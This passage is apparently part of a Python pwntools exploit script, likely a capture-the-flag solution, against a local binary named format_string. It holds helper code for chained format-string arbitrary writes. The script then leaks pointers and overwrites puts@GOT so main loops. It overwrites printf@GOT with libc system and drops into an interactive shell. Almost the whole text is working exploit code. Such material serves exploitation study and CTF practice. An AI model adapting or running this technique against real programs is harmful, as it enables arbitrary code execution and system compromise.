			take a number, break it down so it looks like a string
		"""
		hexStr = hex(data)[2:][::-1] # little endian
		# if len(hexStr) %2 != 0:
		#   hexStr = '0' + hexStr
		byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]
		bytes = [int(x,16) for x in byteList]
		return bytes


	def write_and_prep_next(self, offsets, byte, next_lsb):
		"""
			|can't change|  |change LSB|  |full control|
			|____________|__|__________|__|____________|
			|   offset1  |->|  offset2 |->|  offset3   |
			____________________________________________

			use offset1 to change the LSB of offset2
			use offset2 to change all the bytes of offset3
			use offset3 to write wherever


			this function writes byte to offset 3 using offset2
			and increases offset2 by 1 by writing to it's LSB using 
			offset 1, which prepares it for the next write
		"""
		self.current_val = 0
		# write the current value
		payload = self.off_write(offsets[1], byte)
		# prepare our wiggle ninja pointer for the next format string
		payload +=self.off_write(offsets[0], next_lsb)

		return payload

	def payload_chain_offsets(self, offsets, address, data):
		"""
			Generate a payload that chains together 
			a few offsets to write 

			address is the address of the second pointer
		"""
		lsbAddr3 = self.decompose_data(address)[0]
		bytes = self.decompose_data(data)
		payload = partial(self.write_and_prep_next, offsets=offsets)
		next_lsbs = [lsbAddr3 + x for x in [1,2,3,0]]
		arr = [payload(byte=b, next_lsb=l) for b,l in zip(bytes,next_lsbs)]
		return arr

	def arbitrary_write(self, addr, data):
		"""
			this requires multiple format hits so it just returns
			an array of payloads that you need to have execute sequentially
			can't be calling other stuff inbetween or things might break
		"""
		if not self.chain_starter:
			raise "U NO HAVE THIS POWER"
			return
		# these are the two staring offsets of the chain
		# the third is the one that you'll end up using to write the data
		offset1 = self.chain_starter.offset
		offset2 = self.chain_starter.next.offset
		offset3 = self.chain_starter.next.next.offset

		# run these payloads to accomplish your dreams of arbirtary writing
		payloads  = self.payload_chain_offsets(
			data=addr,                         # write the address you want to offset 3
			offsets=[offset1, offset2],           # use the first 2 to do this
			address=self.chain_starter.next.value # the address is the address of the 3rd offset
		)

		payloads += self.payload_chain_offsets(
			data=data,                      # this is the data that you want to write
			offsets=[offset2, offset3],     # use the 2nd and 3rd offsets
			address=addr                 # this is the addres to write to
		)

		return payloads


progName = "./format_string"
binary = elf.ELF(progName)

conn = process(progName)
welcome = conn.recvuntil('>')
welcome += conn.recvuntil('>')
welcome += conn.recvuntil('>')
print welcome,


def do_fmt(fmt):

	conn.sendline("A"*10*4 + "B")
	conn.recvuntil('AAAB')
	conn.recvuntil("format string>")
	fmt = "-a" + fmt + "b-"
	conn.sendline(fmt)
	conn.recvuntil('-a')
	resp = conn.recvuntil('b-')[:-3]

	if resp.count('-a') > 0:
		resp = resp[:resp.index('-a')]
		print "lolz got our string"
		resp += "INPUT STRING"
		resp += conn.recvuntil('b-')[:-3]
	print "LEAk"
	print resp
	print "LEAkaa"
	return resp


def do_fmt_initial(fmt):

	conn2 = process(progName)
	welcome = conn2.recvuntil('>')
	welcome += conn2.recvuntil('>')
	welcome += conn2.recvuntil('>')
	# print welcome,
	conn2.sendline(fmt)
	ret = conn2.recvuntil('Having fun?')
	conn2.close()
	print ret
	return ret


# fmt.find_offset(1)
# ---> found that offset == 7, padding_len = 1

# fmt.smart_leaks()
# tells me what pointers I've got to play with
libc = binary.libc

fmt = FormatStringLeaker(binary=binary, libc=libc, format_func=do_fmt_initial, offset=7, padding=1, saveFile="./obj", runs_fresh=True)
fmt.smart_leaks()

# put the program in a loop
jmp_spot = binary.symbols['main'] + 0x2f
puts_got = binary.symbols['got.puts']
printf_got = binary.symbols['got.printf']
payload = fmt.payload_write_data_to_addr(jmp_spot, puts_got)
send(conn, payload)


# update our leaker becasue we are now in a loop
fmt.update_leak_func(do_fmt, runs_fresh=False)
fmt.fix_all_the_leaks()
fmt.update_the_leaks()

system = libc.symbols["system"]
payload = fmt.payload_write_data_to_addr(system, printf_got)
send(conn, payload)
conn.interactive()


